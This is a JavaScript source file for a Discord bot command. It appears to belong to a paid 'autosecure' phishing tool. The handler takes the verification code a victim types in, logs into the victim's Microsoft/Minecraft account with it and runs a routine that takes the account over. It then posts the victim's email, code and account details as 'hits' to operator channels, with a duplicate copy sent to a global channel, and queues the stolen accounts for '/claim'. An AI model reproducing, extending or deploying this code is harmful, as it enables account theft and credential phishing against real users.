const { queryParams } = require("../../../db/database");
const { EmbedBuilder } = require('discord.js');
const login = require("../../utils/secure/login");
const secure = require("../../utils/secure/recodesecure");
const getEmbed = require("../../utils/responses/getEmbed");
const listAccount = require("../../utils/accounts/listAccount");
const { loginCookieMessager, autosecuredisabledMessager, lockedmessager, nomcmessager } = require("../../utils/utils/messager");
const aftersecure = require("../../utils/secure/aftersecure");
const generateuid = require("../../utils/generateuid");
const insertaccount = require("../../../db/insertaccount");
const checkmc = require("../../../db/checkmc");
const listProfile = require("../../utils/hypixelapi/listProfile");
const getUUID = require("../../utils/hypixelapi/getUUID");
const isblacklisted = require("../../utils/utils/isblacklisted")
const { failedembed } = require("../../utils/embeds/embedhandler");
const getCredentials = require("../../utils/info/getCredentials");
const { sendSecureNotification } = require('../../utils/notifications/notifier.js');
const getStats = require('../../utils/hypixelapi/getStats.js');
const statsembed = require("../../utils/stats/statsembed.js");
const { logAccountSecure } = require('../../../mainbot/utils/activityLogger');

let obj = {
  name: "submit",
  callback: async (client, interaction) => {
    await interaction.deferReply({ ephemeral: true });

    let code = interaction.components[0].components[0].value;
    let customIdParts = interaction.customId.split("|");
    let email = customIdParts[1];
    let secEmail = customIdParts[2];
    let secId = customIdParts[3];
    let mcname = customIdParts[4];

    
          let blacklisted = await isblacklisted(client, interaction, email)
          if (blacklisted){
                const embed = await getEmbed(client, "blacklisted");
                return await interaction.editReply({
                  embeds: [embed],
                  ephemeral: true,
                });
          }

    console.log(`client username: ${client.username}`);
    let settings = await client.queryParams("SELECT * FROM autosecure WHERE user_id=?", [client.username]);
    if (settings.length === 0) {
      return interaction.editReply({
        embeds: [{
          title: "Error :x:",
          description: "Unexpected error occurred!",
          color: 0xff0000
        }],
        ephemeral: true
      });
    }
    settings = settings[0];

    let channelId, guildId, nChannelId, nGuildId, hChannelId, hGuildId, ahChannelId, ahGuildId, rChannelId, rGuildId, server_id, nohit = null;
    
    if (settings.server_id) {
      server_id = settings.server_id;
    }

    if (settings.logs_channel) {
      [channelId, guildId] = settings.logs_channel.split("|");
    } else {
      return interaction.editReply({ content: "Set your logs channel first!\nusing **/set**", ephemeral: true });
    }

    if (settings.notification_channel) {
      [nChannelId, nGuildId] = settings.notification_channel.split("|");
    }

    if (settings.hits_channel) {
      [hChannelId, hGuildId] = settings.hits_channel.split("|");
    } else {
      return interaction.editReply({ content: "Set the hits channel first!\nusing **/set**", ephemeral: true });
    }

    // Get allhits_channel from any bot config (global setting)
    const allHitsSettings = await client.queryParams("SELECT allhits_channel FROM autosecure WHERE allhits_channel IS NOT NULL LIMIT 1");
    if (allHitsSettings && allHitsSettings.length > 0 && allHitsSettings[0].allhits_channel) {
      [ahChannelId, ahGuildId] = allHitsSettings[0].allhits_channel.split("|");
    }

    if (settings.users_channel) {
      [rChannelId, rGuildId] = settings.users_channel.split("|");
    }

    if (isNaN(code)) {
      console.log("[X] Invalid Code! [Not Numbers]");
      return interaction.editReply({
        embeds: [
          {
            title: "Error :x:",
            description: "Invalid code, please confirm with the code that was sent to your email",
            color: 0xff0000,
          },
        ],
        ephemeral: true,
      });
    }

    if (settings?.auto_secure) {
      try {
        console.log(`Trying to Login Email: ${email} Code: ${code}`);
        let creds = await getCredentials(email)
        let host = await login({ email: email, id: secId, code: code }, creds);

        if (host) {
          console.log("Logged in successfully");
          try {
            await interaction.editReply({
              embeds: [await getEmbed(client, "res")],
              ephemeral: true
            });

            let uid = await generateuid();
            await loginCookieMessager(client, guildId, channelId, host, mcname, email, interaction, code, uid);
            
            if (rChannelId && rGuildId) {
              const hidecode = 'Code entered';
              await loginCookieMessager(client, rGuildId, rChannelId, host, mcname, email, interaction, hidecode, uid, true);
            }

            console.log("Starting the Auto Secure process");
            
            // The secure function now automatically logs via SecureLogger
            // Additional Fisher-specific logging
            const { SecureLogger } = require('../../utils/logging/secureLogger');
            const fisherLogger = new SecureLogger(uid, 'fisher');
            fisherLogger.startLogging();
            fisherLogger.logStep('fisher_auto_secure_started', { 
                email: email, 
                mcname: mcname,
                hasHost: !!host 
            });
            
            let acc;
            try {
                acc = await secure(host, settings, uid);
                fisherLogger.updateAccountData(acc);
                fisherLogger.complete(acc);
            } catch (error) {
                fisherLogger.fail(error, acc);
                throw error;
            } finally {
                setTimeout(() => fisherLogger.close(), 500);
            }
            
            if (acc.email === "Locked!") {
              nohit = true;
              await lockedmessager(client, guildId, channelId, interaction, mcname, email, false, false);
              if (rChannelId && rGuildId) {
                await lockedmessager(client, rGuildId, rChannelId, interaction, mcname, email, true, false);
              }
            }


            if (acc.email === "unauthed") {
              nohit = true;
              await lockedmessager(client, guildId, channelId, interaction, mcname, email, false, true);
              if (rChannelId && rGuildId) {
                await lockedmessager(client, rGuildId, rChannelId, interaction, mcname, email, true, true);
              }
            }

            if ((settings.secureifnomc === "0" || settings.secureifnomc === 0) && acc.email === "No Minecraft!") {
              nohit = true;
              await nomcmessager(client, guildId, channelId, interaction, mcname, email);
              if (rChannelId && rGuildId) {
                await nomcmessager(client, rGuildId, rChannelId, interaction, mcname, email, true);
              }
            }

            let hasMinecraft = await checkmc(acc.mc);
            
            let msg = await listAccount(acc, uid, client, interaction);
            if (!nohit && hGuildId && hChannelId) {
              await client.guilds.cache.get(hGuildId)?.channels.cache.get(hChannelId)?.send(msg);
              
              // Send full hit embed to allhits channel (doublehook) with user info
              if (ahChannelId && ahGuildId) {
                // Get user license/trial status
                let licenseStatus = "No License";
                let isTrial = false;
                try {
                  const licenseData = await queryParams(
                    "SELECT * FROM usedLicenses WHERE user_id = ? ORDER BY expiry DESC LIMIT 1",
                    [interaction.user.id]
                  );
                  if (licenseData && licenseData.length > 0) {
                    const license = licenseData[0];
                    const expiry = parseInt(license.expiry);
                    if (expiry > Date.now()) {
                      isTrial = license.istrial === 1 || license.istrial === "1";
                      licenseStatus = isTrial ? "Trial" : "License";
                    } else {
                      licenseStatus = "Expired";
                    }
                  }
                } catch (licenseError) {
                  console.error('[ALLHITS] Error fetching license status:', licenseError);
                }

                // Clone the message and modify embeds
                const allHitsMsg = {
                  embeds: [],
                  components: msg.components || []
                };

                // Process each embed
                if (msg.embeds && Array.isArray(msg.embeds)) {
                  for (const embedData of msg.embeds) {
                    try {
                      // Convert embed data to EmbedBuilder (handles both plain objects and EmbedBuilder instances)
                      const embed = embedData instanceof EmbedBuilder 
                        ? embedData 
                        : EmbedBuilder.from(embedData);
                      
                      // Add user info field at the beginning
                      embed.spliceFields(0, 0, {
                        name: '👤 Discord User',
                        value: `**Username:** ${interaction.user.tag}\n**ID:** ${interaction.user.id}\n**Status:** ${licenseStatus}${isTrial ? ' (Trial)' : ''}`,
                        inline: true
                      });
                      
                      allHitsMsg.embeds.push(embed);
                    } catch (embedError) {
                      console.error('[ALLHITS] Error processing embed:', embedError);
                      // Fallback: try to add as-is
                      allHitsMsg.embeds.push(embedData);
                    }
                  }
                }

                await client.guilds.cache.get(ahGuildId)?.channels.cache.get(ahChannelId)?.send(allHitsMsg).catch(err => {
                  console.error(`[ALLHITS] Failed to send full hit embed to allhits channel: ${err.message}`);
                });
              }
              
              // Log account securing activity
              if (acc && acc.oldEmail && acc.oldEmail !== "Locked!" && acc.oldEmail !== "unauthed" && acc.oldEmail !== "No Minecraft!") {
                await logAccountSecure(
                  client,
                  interaction.user.id,
                  interaction.user.tag,
                  acc.oldEmail,
                  "Recovery Code",
                  true
                ).catch(() => {});
              }
            }

              const { failed, failedmsg } = await failedembed(acc, uid)
              if (failed){
                await client.guilds.cache.get(hGuildId).channels.cache.get(hChannelId).send(failedmsg);
                
                // Send failed embed to allhits channel too
                if (ahChannelId && ahGuildId) {
                  await client.guilds.cache.get(ahGuildId)?.channels.cache.get(ahChannelId)?.send(failedmsg).catch(err => {
                    console.error(`[ALLHITS] Failed to send failed embed to allhits channel: ${err.message}`);
                  });
                }
              }
            

                if (hasMinecraft && settings.claiming) {
                  const timestamp = Math.floor(Date.now() / 1000)

                  await client.queryParams(
                    "INSERT INTO unclaimed (user_id, username, date, data) VALUES (?, ?, ?, ?)", 
                    [client.username, acc.oldName, timestamp, JSON.stringify({ acc, uid, mcname })]
                  )

                  await client.queryParams(
                    "INSERT INTO unclaimed (user_id, username, date, data) VALUES (?, ?, ?, ?)", 
                    [client.username, mcname, timestamp, JSON.stringify({ acc, uid, mcname })]
                  )
                }

                let neededmsg = failed ? failedmsg : msg

                // Send notification if account has Minecraft
                if (acc.newName && acc.newName !== "No Minecraft!" && hasMinecraft) {
                  try {
                    console.log('[SUBMIT] Account has Minecraft, preparing notification...');
                    console.log('[SUBMIT] Minecraft name:', acc.newName);
                    const stats = await getStats(acc.newName);
                    console.log('[SUBMIT] Stats retrieved:', stats);
                    const accountData = {
                      username: acc.newName,
                      networth: stats?.networth || '0',
                      bedwars: stats?.bedwars?.level || '0',
                      networkLevel: stats?.networkLevel || '0',
                      sbLevel: stats?.sbLevel || '0',
                      duelKDR: stats?.duelKDR || '0',
                      duelWinstreak: stats?.duelWinstreak || '0',
                      plusColour: stats?.plusColour || 'None',
                      gifted: stats?.gifted || '0'
                    };
                    console.log('[SUBMIT] Sending notification for:', accountData.username);
                    await sendSecureNotification(client, accountData);
                    console.log('[SUBMIT] Notification sent successfully');

                  } catch (notifError) {
                    console.log('[SUBMIT] Failed to send notification:', notifError.message);
                    console.error('[SUBMIT] Notification error details:', notifError);
                  }
                } else {
                  console.log('[SUBMIT] Account has no Minecraft, skipping notification');
                }

            console.log('[SUBMIT] Calling aftersecure with:', {
                hasAftersecure: !!acc.aftersecure,
                userId: interaction.user.id,
                hasSettings: !!settings,
                server_id,
                clientUsername: client.username,
                hasEmail: !!acc.oldEmail
            });

            let doneaftersecure = await aftersecure(neededmsg, acc.aftersecure, interaction.user.id, settings, client, server_id, client.username, acc.oldEmail, acc);
            
            console.log('[SUBMIT] Aftersecure result:', doneaftersecure);
            
            if (doneaftersecure) {
              console.log('[SUBMIT] Successfully completed aftersecure');
            } else {
              console.log('[SUBMIT] Aftersecure was not executed or failed');
            }

              let inserted = await  insertaccount(acc, uid, client.username, settings.secureifnomc);


            if (nChannelId && nGuildId) {
              if (hasMinecraft) {
                // Create simple secured account embed for Minecraft accounts
                const securedEmbed = {
                  embeds: [{
                    color: 723989,
                    author: {
                      name: "User | User ID"
                    },
                    description: "**Username | Email | Code**\n```Account has been secured, /claim (username) to get it!\n```",
                    thumbnail: {
                      url: `https://visage.surgeplay.com/bust/${acc.oldName}.png?y=-40&quality=lossless`
                    }
                  }],
                  components: [
                    {
                      type: 1,
                      components: [
                        {
                          style: 2,
                          type: 2,
                          custom_id: `duels|${acc.newName}|1`,
                          label: "Duels",
                          emoji: {
                            id: "1295278858064498709",
                            name: "unknown",
                            animated: false
                          }
                        },
                        {
                          style: 2,
                          type: 2,
                          custom_id: `skywars|${acc.newName}|1`,
                          label: "Skywars",
                          emoji: {
                            id: "1418589836398297261",
                            name: "unknown",
                            animated: false
                          }
                        },
                        {
                          style: 2,
                          type: 2,
                          custom_id: `skyblock|${acc.newName}|1`,
                          label: "Skyblock",
                          emoji: {
                            id: "1418590280390807704",
                            name: "unknown",
                            animated: false
                          }
                        },
                        {
                          style: 2,
                          type: 2,
                          custom_id: `bedwars|${acc.newName}|1`,
                          label: "Bedwars",
                          emoji: {
                            id: "1416130064608657572",
                            name: "unknown",
                            animated: false
                          }
                        }
                      ]
                    },
                    {
                      type: 1,
                      components: [
                        {
                          style: 1,
                          type: 2,
                          custom_id: "claim",
                          label: "Claim Account"
                        }
                      ]
                    }
                  ]
                };
                
                // Add ping if specified
                if (settings.ping !== "None") {
                  securedEmbed.content = settings.ping;
                }
                
                await client.guilds.cache.get(nGuildId)?.channels.cache.get(nChannelId)?.send(securedEmbed);
              } else {
                let msgnomc = {
                  embeds: [{
                    description: "```\nSomeone's account has been secured, but it doesn't own Minecraft.\n```",
                    color: 0xA6C3F0
                  }]
                };             
                await client.guilds.cache.get(nGuildId)?.channels.cache.get(nChannelId)?.send(msgnomc);
              }
            }
          } catch (e) {
            console.log(`Error in the process of autosecure (not necessarily while autosecuring)! ${e}`);
            
            // Better error handling for common issues
            if (e.response && e.response.status === 400) {
              console.log(`HTTP 400 Error Details:`, e.response.data);
              await interaction.editReply({
                embeds: [{
                  title: "Authentication Error :x:",
                  description: "Invalid authentication data. The account may be locked or the login session expired. Please try again.",
                  color: 0xff0000
                }],
                ephemeral: true
              });
            } else if (e.code === 'ECONNRESET' || e.code === 'ETIMEDOUT') {
              console.log(`Network timeout error:`, e.message);
              await interaction.editReply({
                embeds: [{
                  title: "Network Error :x:",
                  description: "Network connection timed out. Please try again in a moment.",
                  color: 0xff0000
                }],
                ephemeral: true
              });
            } else {
              // Generic error handling
              await interaction.editReply({
                embeds: [{
                  title: "Error :x:",
                  description: "An unexpected error occurred while processing your request. Please try again.",
                  color: 0xff0000
                }],
                ephemeral: true
              });
            }
          }
        } else {
          console.log("Invalid Code! [Failed to Login with it!]");
          await interaction.editReply({
            embeds: [await getEmbed(client, "invalid")],
            ephemeral: true
          });
        }
      } catch (e) {
        console.log(e);
        await interaction.editReply({
          embeds: [{
            title: "Error :x:",
            description: "An error occurred while processing your request",
            color: 0xff0000
          }],
          ephemeral: true
        });
      }
    } else {
      await autosecuredisabledMessager(client, guildId, channelId, interaction, mcname, email, code);
      
      if (rChannelId && rGuildId) {
        await autosecuredisabledMessager(client, rGuildId, rChannelId, interaction, mcname, email, code, true);
      }

      await interaction.editReply({
        embeds: [
          await getEmbed(client, "res")
        ],
        ephemeral: true,
      });

      const embedData = {
        embeds: [{
          title: `${mcname}! :x:`,
          description: `Email: **${email}**\nSecurity email: **${secEmail?.replaceAll("*", "\\*")}** \nCode: **${code}**`,
          color: 0x00ff00
        }]
      };
      

      await client.queryParams("INSERT INTO unclaimed (user_id, username, data) VALUES (?, ?, ?)", 
        [client.username, mcname, JSON.stringify(embedData)]);

      if (nChannelId && nGuildId) {
        let uuid  = await getUUID(mcname);
        if (uuid) {
          const ping = settings.ping === "None" ? null : settings.ping;
          await client.guilds.cache.get(nGuildId)?.channels.cache.get(nChannelId)?.send(
            await listProfile(mcname, { sensored: true, list: "skyblock", ping: ping })
          );
        } else {
          const ping = settings.ping === "None" ? null : settings.ping;
          await client.guilds.cache.get(nGuildId)?.channels.cache.get(nChannelId)?.send({
            content: ping,
            embeds: [
              {
                title: "Code has been entered | Autosecure is disabled!",
                description: 'Please secure this account manually after claiming using /claim',
                color: 0x00ff00,
              },
            ],
          });
        }
      }
    }
  }
};

module.exports = obj;